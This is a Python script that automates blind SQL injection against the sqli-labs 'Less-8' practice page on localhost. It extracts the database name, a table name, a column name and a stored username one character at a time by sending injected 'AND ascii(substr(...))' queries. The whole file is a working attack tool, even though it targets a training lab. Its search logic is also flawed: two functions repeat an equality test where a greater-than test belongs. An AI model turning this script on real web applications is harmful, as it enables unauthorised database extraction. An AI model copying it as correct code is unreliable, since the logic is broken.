# This script automates the enumeration of database name from lab 8 in sqli labs

import requests
from bs4 import BeautifulSoup as bs

LOW_LIMIT = 65
HIGH_LIMIT = 122

db_name_arr = []
table_name_arr  = []
column_name_arr = []
dump_data = []

# The parser
def parse(res_html)->bool:
	flag = False
	html_parsed = bs(res_html,'html.parser')
	for font in html_parsed.find_all("font"):
		if font.get_text() == "You are in...........":
			flag = True
	return flag

# Using partial binary search logic
def db_name_func(offset):
	mid = (97+122)//2
	
	while mid >= LOW_LIMIT and mid <= HIGH_LIMIT:
		# Check if the mid value and ascii are the same
		r = requests.get(f"http://localhost:8000/Less-8/?id=1' AND (ascii(substr((select database()),{offset},1)) = {mid}) --+")
		parseinit = parse(r.text)
		if parseinit:
			db_name_arr.append(chr(mid))
			break
		# Check is the mid value is less than the ascii value
		r = requests.get(f"http://localhost:8000/Less-8/?id=1' AND (ascii(substr((select database()),{offset},1)) > {mid}) --+")
		parseinit = parse(r.text)
		if parseinit:
			mid = mid+1
		else:
			mid = mid - 1
		
			
def dump_table_func(offset):
	mid = (97+122)//2
	while mid >= LOW_LIMIT and mid <= HIGH_LIMIT:
		# Check if the mid value and ascii are the same
		# http://localhost:8000/Less-8/?id=1' AND (ascii(select substr(table_name,1,1) from information_schema.tables where table_schema = 'security') = {mid}) --+
		r = requests.get(f"http://localhost:8000/Less-8/?id=1' AND (select ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),{offset},1)) = {mid}) --+")
		parseinit = parse(r.text)
		if parseinit:
			table_name_arr.append(chr(mid))
			break
		# Check is the mid value is less than the ascii value
		r = requests.get(f"http://localhost:8000/Less-8/?id=1' AND (select ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),{offset},1)) > {mid}) --+")
		parseinit = parse(r.text)
		if parseinit:
			mid = mid+1
		else:
			mid = mid - 1
			
			
def dump_column_func(offset):
	mid = (97+122)//2
	while mid >= LOW_LIMIT and mid <= HIGH_LIMIT:
		# Check if the mid value and ascii are the same
		# http://localhost:8000/Less-8/?id=1' AND (ascii(select substr(table_name,1,1) from information_schema.tables where table_schema = 'security') = {mid}) --+
		r = requests.get(f"http://localhost:8000/Less-8/?id=1' AND (select ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),{offset},1)) = {mid}) --+")
		parseinit = parse(r.text)
		if parseinit:
			column_name_arr.append(chr(mid))
			break
		# Check is the mid value is less than the ascii value
		r = requests.get(f"http://localhost:8000/Less-8/?id=1' AND (select ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),{offset},1)) = {mid}) --+")
		parseinit = parse(r.text)
		if parseinit:
			mid = mid+1
		else:
			mid = mid - 1
			
def total_dump(offset):
	mid = (97+122)//2
	while mid >= LOW_LIMIT and mid <= HIGH_LIMIT:
		# Check if the mid value and ascii are the same
		# http://localhost:8000/Less-8/?id=1' AND (ascii(select substr(table_name,1,1) from information_schema.tables where table_schema = 'security') = {mid}) --+
		r = requests.get(f"http://localhost:8000/Less-8/?id=1' AND (select ascii(substr((select username from users limit 0,1),{offset},1)) = {mid}) --+")
		parseinit = parse(r.text)
		if parseinit:
			dump_data.append(chr(mid))
			break
		# Check is the mid value is less than the ascii value
		r = requests.get(f"http://localhost:8000/Less-8/?id=1' AND (select ascii(substr((select username from users limit 0,1),{offset},1)) = {mid}) --+")
		parseinit = parse(r.text)
		if parseinit:
			mid = mid+1
		else:
			mid = mid - 1
	
		
def main():
	for i in range(1,10,1):
		db_name_func(i)
	
	for i in range(1,10,1):
		dump_table_func(i)
	
	for i in range(1,15,1):
		dump_column_func(i)

	for i in range(1,10,1):
		total_dump(i)

	
	print("Database name is:" ,"".join(db_name_arr))
	print("Table name is: ","".join(table_name_arr))
	print("Column name: ","".join(column_name_arr))
	print("Dump data: ","".join(dump_data))
	
	

if __name__ == '__main__':
	main()

	
	
